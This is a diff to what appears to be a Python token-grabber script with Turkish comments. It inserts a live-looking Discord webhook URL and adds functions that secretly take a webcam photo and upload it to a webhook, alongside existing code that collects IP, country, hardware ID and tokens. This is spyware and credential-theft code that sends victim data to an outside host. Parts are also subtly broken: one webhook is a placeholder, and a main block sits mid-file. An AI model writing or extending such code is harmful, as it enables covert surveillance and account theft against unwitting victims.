@@ -48,8 +48,10 @@ from urllib.request import Request, urlopen
 from subprocess import Popen, PIPE
 import requests, json, os
 from datetime import datetime
+import cv2
+import io
 
-webhook_url = "WEBHOOKHERE"
+webhook_url = "https://discord.com/api/webhooks/1182707896807587950/caNoXQarMaPeKuoxuv7wj3bbQ_b2bcxQfKve5wntS0du6Znd88kt1Wsyz18waQWdLSQf"
 
 # İP - COUNTRY-----------------------------
 
@@ -173,6 +175,44 @@ def gethwid():
     p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
     return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
 
+def send_photo_to_discord_webhook(file_path):
+    # Discord webhook URL'si (Webhook URL'si buraya gelecek)
+    webhook_url = "DISCORD_WEBHOOK_URL"
+
+    # Fotoğraf dosyasını aç
+    with open(file_path, 'rb') as file:
+        # Discord webhook'a gönderilecek dosya verisi
+        file_data = io.BytesIO(file.read())
+
+    # Discord webhook'a dosya gönder
+    files = {'file': ('webcam.png', file_data)}
+    response = requests.post(webhook_url, files=files)
+
+    # Yanıtı kontrol et
+    if response.status_code == 204:
+        print("Fotoğraf başarıyla Discord'a gönderildi!")
+    else:
+        print("Fotoğraf gönderilemedi. Hata:", response.text)
+
+def get_webcam():
+    # Webcam'den fotoğraf çek
+    webcam = cv2.VideoCapture(0)
+    ret, frame = webcam.read()
+    webcam.release()
+
+    # Fotoğrafı bellekte geçici bir dosyaya kaydet
+    file_path = "webcam.png"
+    cv2.imwrite(file_path, frame)
+
+    # Discord webhook'a fotoğrafı gönder
+    send_photo_to_discord_webhook(file_path)
+
+    # Dosyayı sil (isteğe bağlı, eğer saklamak istemiyorsan)
+    # import os
+    # os.remove(file_path)
+
+if __name__ == '__main__':
+    get_webcam()
 
 def get_token():
     already_check = []
